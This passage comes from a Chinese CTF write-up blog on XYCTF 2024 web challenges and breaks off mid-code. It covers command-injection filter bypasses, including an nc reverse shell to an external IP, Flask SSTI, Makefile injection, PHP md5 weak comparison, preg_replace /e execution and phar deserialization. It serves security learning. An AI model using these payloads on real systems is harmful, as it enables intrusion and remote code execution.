class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure><p>过滤了很多，虽然有些命令执行函数没过滤，但echo过滤了就导致没有回显，没回显那就反弹shell，对于<code>eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);</code>，绕过前面字符串用换行符<code>%0a</code>，后面就用注释符<code>%23</code>。限制了长度，那就再引入个变量就行，长度小于7只能引用GET方法，因为他遍历的又是整个GET方法传的参数，所以正则匹配对引入的变量也有效。过滤了a，不能用bash反弹，用nc，过滤bin关键字，中间插个<code>&#39;&#39;</code>就行，payload：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=%0a`<span class="variable">$_GET</span>[1]`;%23&amp;1=nc 121.40.195.194 2333 -e /b<span class="string">&#x27;&#x27;</span><span class="keyword">in</span>/sh</span></span><br></pre></td></tr></table></figure><h3 id="我是一个复读机（ssti过滤单双引号、下划线、关键字）"><a href="#我是一个复读机（ssti过滤单双引号、下划线、关键字）" class="headerlink" title="我是一个复读机（ssti过滤单双引号、下划线、关键字）"></a>我是一个复读机（ssti过滤单双引号、下划线、关键字）</h3><p>开题给了提示用户名为<code>admin</code>，密码也给了字典，跑一下就出了，很贴心，好评，上次nk如果不是ljl给我说密码就爆0了，密码是<code>asdqwe</code>，进来后</p><p><img src="https://img2.imgtp.com/2024/04/29/A1pwVmwt.png" alt="image-20240402203112980.png"></p><p>不管输啥都是回显你输的，除了输入waf会回显</p><p><img src="https://img2.imgtp.com/2024/04/29/mXxAkqWU.png" alt="image-20240402203217837.png"></p><p>输入中文会出现</p><p><img src="https://img2.imgtp.com/2024/04/29/UawCPfzQ.png" alt="image-20240402203300273.png"></p><p>后面出现<code>&#123;&#123;&#125;&#125;</code>，看起来像个ssti，而且不用输<code>&#123;&#123;&#125;&#125;</code>，输入<code>你好7*7</code>，回显</p><p><img src="https://img2.imgtp.com/2024/04/29/Ds6hEQMY.png" alt="image-20240402203359796.png"></p><p>确定是ssti了，手测了一下，过滤了<code>_</code>、<code>&#39;</code>、<code>&quot;</code>、<code>flag</code>、<code>system</code>，还有其他的啥，最终payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sentence=你好(lipsum|attr(request.<span class="keyword">values</span>.a)).<span class="keyword">get</span>(request.<span class="keyword">values</span>.b).popen(request.<span class="keyword">values</span>.c).<span class="keyword">read</span>()&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><blockquote><p>解释一下上述代码：lipsum是flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块，request.values.x表示接受所有参数，包括get传参和post传参。这里就是先用lipsum得到builtins，然后从中获取了 <code>os</code> 模块，并使用 <code>os.popen()</code> 执行了一个命令</p></blockquote><p>这里注意要用GET传参，直接输在框里不行，应该是他把输在框里的都当作字符串处理了，就导致<code>&amp;</code>失效了</p><h3 id="ezMake-（makefile命令）"><a href="#ezMake-（makefile命令）" class="headerlink" title="ezMake （makefile命令）"></a>ezMake （makefile命令）</h3><p>进题是个输入框</p><p><img src="https://img2.imgtp.com/2024/04/29/qtfOYpOz.png" alt="image-20240402205222232.png"></p><p>搜索了一下makefile命令，直接出了，payload：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">shell</span><span class="language-bash"> <span class="built_in">cat</span> flag)</span></span><br></pre></td></tr></table></figure><blockquote><p>解析：在Makefile中，<code>$(shell)</code> 是一个函数，用于执行系统命令并将其输出作为字符串返回。这个命令会读取名为 <code>flag</code> 的文件的内容，并将其作为字符串返回给Makefile。</p></blockquote><h3 id="ez-Make（makefile命令过滤-、-、关键字）"><a href="#ez-Make（makefile命令过滤-、-、关键字）" class="headerlink" title="ez?Make（makefile命令过滤$、&#x2F;、关键字）"></a>ez?Make（makefile命令过滤$、&#x2F;、关键字）</h3><p>跟上面那题一样，waf多了<code>$</code>、<code>flag</code>、<code>shell</code>、<code>/</code>啥的很多都用不了，感觉用了一种非预期，猜flag在flag文件中，用正则匹配来绕过关键字过滤，<code>more</code>用于查看文件内容，<code>cd ..</code>来绕过<code>/</code>，payload：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;<span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;<span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;more [e-h][k-m][^-b][e-h]</span><br></pre></td></tr></table></figure><h3 id="ezmd5（md5碰撞）"><a href="#ezmd5（md5碰撞）" class="headerlink" title="ezmd5（md5碰撞）"></a>ezmd5（md5碰撞）</h3><p>开题</p><p><img src="https://img2.imgtp.com/2024/04/29/yeYTdMCo.png" alt="image-20240403125853480.png"></p><p>结合题目，判断这个跟上次那个qsnctf2024的那个md5题一样，上次是传入两个pdf文件，然后md5值相同，这里是传入图片，试了下直接改后缀名再用记事本写入两个md5值相同的数好像不行，就搜了一下md5值相同的两张图片，在这里找到两张图片就可以</p><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p><p>有个工具叫fastcoll好像是专门生成这种md5碰撞的玩意，懒得弄了</p><h3 id="εZ-¿м-Kε¿-（）"><a href="#εZ-¿м-Kε¿-（）" class="headerlink" title="εZ?¿м@Kε¿?（）"></a>εZ?¿м@Kε¿?（）</h3><p>和上面两道一样，浩哥的payload：<code>$$(&lt;$&lt;)</code></p><blockquote><p>$&lt;代表第一个依赖文件，也就是flag文件，$&lt;前面的&lt;是读的意思，$()也就是执行命令，不知道第一个$啥意思，等赛后看大佬的wp吧（看了佬的wp，原来这里两个$$才代表一个$，那就解释的通了）</p></blockquote><p><img src="https://img2.imgtp.com/2024/04/29/0C9k2jo5.png" alt="image-20240418200950284.png"></p><h3 id="warm-up（md5弱比较、绕过preg-match、preg-match-e执行）"><a href="#warm-up（md5弱比较、绕过preg-match、preg-match-e执行）" class="headerlink" title="warm up（md5弱比较、绕过preg_match、preg_match &#x2F;e执行）"></a>warm up（md5弱比较、绕过preg_match、preg_match &#x2F;e执行）</h3><p>开题就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先第一层</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET<span class="selector-attr">[<span class="string">&#x27;val1&#x27;</span>]</span>) &amp;&amp; <span class="built_in">isset</span>($_GET<span class="selector-attr">[<span class="string">&#x27;val2&#x27;</span>]</span>) &amp;&amp; $_GET<span class="selector-attr">[<span class="string">&#x27;val1&#x27;</span>]</span> != $_GET<span class="selector-attr">[<span class="string">&#x27;val2&#x27;</span>]</span> &amp;&amp; <span class="built_in">md5</span>($_GET<span class="selector-attr">[<span class="string">&#x27;val1&#x27;</span>]</span>) == <span class="built_in">md5</span>($_GET<span class="selector-attr">[<span class="string">&#x27;val2&#x27;</span>]</span></span><br></pre></td></tr></table></figure><p>弱比较绕过不多说</p><p>第二层</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isset</span><span class="params">(<span class="variable">$md5</span>)</span></span> &amp;&amp; <span class="variable">$md5</span> == <span class="built_in">md5</span>(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure><p>传个MD5前后都是0e开头的即可，虽然没说md5咋赋值，但因为开头有<code>extract($_GET);</code>，所以直接用GET方法对md5传参即可</p><p>第三层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>XYCTF_550102591</code>md5加密后是0e开头，所以对XY传个md5后是0e开头的值即可，XYCTF的值在源码开头就给出了，这里我们对其用GET传参把其值改变即可，最终payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?val1=QNKCDZO<span class="variable">&amp;val2</span>=<span class="number">240610708</span><span class="variable">&amp;md5</span>=<span class="number">0e215962017</span><span class="variable">&amp;</span>XY=s878926199a<span class="variable">&amp;</span>XYCTF=s878926199a</span><br></pre></td></tr></table></figure><p>然后访问<code>/LLeeevvveeelll222.php</code>路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">isset</span>($_POST[&#x27;a&#x27;]) <span class="symbol">&amp;&amp;</span> !preg_match(&#x27;/[<span class="number">0</span><span class="number">-9</span>]/&#x27;, $_POST[&#x27;a&#x27;]) <span class="symbol">&amp;&amp;</span> intval($_POST[&#x27;a&#x27;])) </span><br></pre></td></tr></table></figure><p>数组绕过，preg_match遇到数组会返回false</p><p>第二层</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>],$_GET[<span class="string">&#x27;c&#x27;</span>])</span><br></pre></td></tr></table></figure><p>&#x2F;e执行绕过，官方文档：<a href="https://www.php.net/manual/zh/function.preg-replace.php">PHP: preg_replace - Manual</a>，简单来说就是搜索第三个参数中匹配第一个参数的部分， 以第二个参数进行替换，然后将替换后的字符串作为php代码使用eval方式进行执行并返回结果，payload：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?a=/22/e<span class="variable">&amp;b</span>=<span class="meta">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);<span class="variable">&amp;c</span>=22</span><br><span class="line">POST：a[]=1</span><br></pre></td></tr></table></figure><h3 id="pharme（绕过-HALT-COMPILER-检测、php伪协议、无参数rce、-halt-compiler-截断）"><a href="#pharme（绕过-HALT-COMPILER-检测、php伪协议、无参数rce、-halt-compiler-截断）" class="headerlink" title="pharme（绕过__HALT_COMPILER()检测、php伪协议、无参数rce、__halt_compiler();截断）"></a>pharme（绕过__HALT_COMPILER()检测、php伪协议、无参数rce、__halt_compiler();截断）</h3><p>开题是个文件上传</p><p><img src="https://img2.imgtp.com/2024/04/29/hGSROHgZ.png" alt="image-20240408225418789.png"></p><p>看源码，最下面有个<code>class.php</code>，访问下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>先别管，这看着应该是文件包含，结合题目，先上传个<code>phar</code>文件再说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;a=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传后他会显示匹配到了<code>__HALT_COMPILER()</code></p><p><img src="https://img2.imgtp.com/2024/04/29/XRCdd8Np.png" alt="image-20240408232203221.png"></p><p>这里就要将phar文件用gzip命令进行压缩（windows下面好像不行，linux下可以），压缩后的文件就没有了<code>__HALT_COMPILER()</code>，然后再将test.phar.gz后缀改为png（测试过png文件可以上传），这里png文件能解析成功的原因：</p><blockquote><p>PHP编译器在遇到<code>phar</code>文件时，只要检测到文件末尾有<code>__HALT_COMPILER();</code>语句，就会认为这是一个<code>phar</code>文件，而不会考虑文件的后缀名</p></blockquote><p>上传成功</p><p><img src="https://img2.imgtp.com/2024/04/29/wBkusFM5.png" alt="image-20240408233220444.png"></p><p>然后再到<code>class.php</code>里进行文件包含，先看第一层：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,$_POST[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>参数不能以<code>phar://</code>开头，用伪协议绕过即可</p><p>第二层：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&#x27;ch3nx1&#x27;</span> === preg_replace(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,preg_replace(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd))</span><br></pre></td></tr></table></figure><p>这串代码先是将所有大小写字母、下划线 <code>_</code> 和圆括号 <code>()</code> 替换为空字符串，再将处理后的字符串中的连续分号 <code>;</code> 替换为字符串 <code>&#39;ch3nx1&#39;</code>，这个就用无参数rce绕过即可</p><p>第三层：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>($this-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>原本的思路使用注释符啥的，但仔细想想这样就过不了正则了，然后ljl在翻手册时翻到个函数<code>__halt_compiler</code>（tql😍），这里给出官方手册链接：<a href="https://www.php.net/manual/zh/function.halt-compiler.php">PHP: __halt_compiler - Manual</a></p><p>其中有个笔记就很生动地说出了该函数的用法：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If <span class="string">&quot;__halt_compiler();&quot;</span> appears <span class="keyword">in</span> a <span class="built_in">file</span> which <span class="keyword">is</span> <span class="string">&quot;include&quot;</span>d <span class="keyword">or</span> <span class="string">&quot;require&quot;</span>d, <span class="keyword">then</span> <span class="keyword">the</span> called-<span class="keyword">in</span> <span class="built_in">file</span> will be treated <span class="keyword">as</span> <span class="keyword">if</span> <span class="keyword">it</span> physically cuts off <span class="keyword">at</span> <span class="keyword">the</span> <span class="string">&quot;__halt_compiler();&quot;</span>. In other <span class="built_in">words</span>, <span class="string">&quot;__halt_compiler();&quot;</span> only affects <span class="keyword">the</span> physical <span class="built_in">file</span> <span class="keyword">it</span>&#x27;s <span class="keyword">in</span>, an outer <span class="built_in">file</span> <span class="keyword">that</span> pulls <span class="keyword">it</span> <span class="keyword">in</span> will <span class="keyword">continue</span> <span class="keyword">to</span> execute.</span><br></pre></td></tr></table></figure><p>简单来说就是如果一个文件中包含了<code>__halt_compiler();</code>，并且该文件被 “include” 或 “require”，那么被调用的文件会被视为在 <code>__halt_compiler();</code>处截断。所以把这个函数放在无参数rce的后面就可以截断后面的字符串</p><p>先查看下目录，在原本<code>phar</code>文件上稍做修改即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$o</span>-&gt;<span class="attribute">cmd</span>=<span class="string">&#x27;print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));__halt_compiler();&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2.imgtp.com/2024/04/29/et4zcpU6.png" alt="image-20240408224749200.png"></p><p>看到这个flag文件的位置居中，不好读，那就只有随机读了，先把<code>phar</code>文件改了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$o</span>-&gt;<span class="attribute">cmd</span>=<span class="string">&#x27;show_source(array_rand(array_flip(scandir(current(localeconv())))));__halt_compiler();&#x27;</span>;</span><br></pre></td></tr></table></figure><p>再POST传参</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phar:<span class="comment">///tmp/1007eff891b86c550c4a6a188f670a31.png/test.txt</span></span><br></pre></td></tr></table></figure><p>多执行几次就出了</p><h3 id="ezRCE（只用数字-、-、-、-rce）"><a href="#ezRCE（只用数字-、-、-、-rce）" class="headerlink" title="ezRCE（只用数字\、\\、$ 、&lt; rce）"></a>ezRCE（只用数字\、\\、$ 、&lt; rce）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span 